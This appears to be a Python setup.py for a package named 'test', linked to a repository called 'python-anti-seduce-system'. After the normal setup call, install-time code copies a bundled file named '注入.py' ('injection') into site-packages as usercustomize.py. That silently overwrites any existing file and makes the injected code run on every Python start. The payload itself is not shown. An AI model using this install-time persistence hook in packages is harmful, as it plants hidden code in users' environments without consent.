import site
import setuptools
from pathlib import Path

here = Path(__file__).parent


setuptools.setup(
    name='test',
    version='1.0',
    author='DAF201',
    description='a test',
    url='https://github.com/RimoChan/python-anti-seduce-system',
    packages=[],
    classifiers=[
        'Programming Language :: Python :: 3',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.5',
)


with open(here/'注入.py', encoding='utf8') as f:
    with open(Path(site.getsitepackages()[-1]) / 'usercustomize.py', 'w', encoding='utf8') as f2:
        f2.write(f.read())